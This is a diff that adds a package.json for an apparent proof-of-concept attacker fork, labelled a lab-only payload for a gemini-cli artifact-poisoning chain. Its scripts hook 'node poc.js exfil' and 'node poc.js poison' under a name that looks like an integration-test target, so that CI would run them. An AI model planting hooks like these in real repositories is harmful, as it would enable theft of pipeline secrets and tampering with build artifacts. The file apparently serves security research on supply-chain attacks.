@@ -1,0 +1,10 @@
+{
+  "name": "poc-attacker-fork",
+  "version": "1.0.0",
+  "private": true,
+  "description": "Benign PoC payload for the gemini-cli artifact-poisoning chain. Lab use only.",
+  "scripts": {
+    "build": "node poc.js build",
+    "test:integration:sandbox:none": "node poc.js exfil && node poc.js poison"
+  }
+}
